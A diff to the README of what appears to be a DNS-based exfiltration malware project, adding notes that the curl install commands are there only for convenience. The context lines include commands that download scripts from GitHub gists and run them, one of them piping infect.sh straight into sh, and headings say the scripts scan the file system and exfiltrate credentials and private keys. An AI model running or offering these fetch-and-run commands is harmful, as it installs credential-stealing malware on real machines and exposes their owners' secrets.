@@ -45,6 +45,7 @@ You can change the bash scripts `infect.sh` and `one_file.sh` to point to your I
 
 
 ### Exfiltrating a file example (will send to our default DNS server)
+The curl in this case is here just for convenience. In a real-world scenario, an adversary would introduce the payload in a different way as we are assuming only port 53 and a few others are open on the machine (curl wouldn't work in that case). But the goal of this project was to talk about the malware itself rather than the introduction of the malware onto the system.
 ```
 curl https://gist.githubusercontent.com/ColdSauce/a1ff11090994bd6e0c6731dcb407ba7a/raw/9d1456301d493dde762aa0aa7e6cac16e6da6e37/one_file.sh > one_file.sh
 chmod +x one_file.sh
@@ -52,6 +53,7 @@ chmod +x one_file.sh
 ```
 
 ### Scanning entire file system and exfiltrating credentials and private keys
+The curl in this case is here just for convenience. In a real-world scenario, an adversary would introduce the payload in a different way as we are assuming only port 53 and a few others are open on the machine (curl wouldn't work in that case). But the goal of this project was to talk about the malware itself rather than the introduction of the malware onto the system.
 ```
 curl https://gist.githubusercontent.com/ColdSauce/c65f8d70da7ff04246d5da53534995f5/raw/9b191bbccf99d3da22064b87cd7130404e813442/infect.sh | sh
 ```
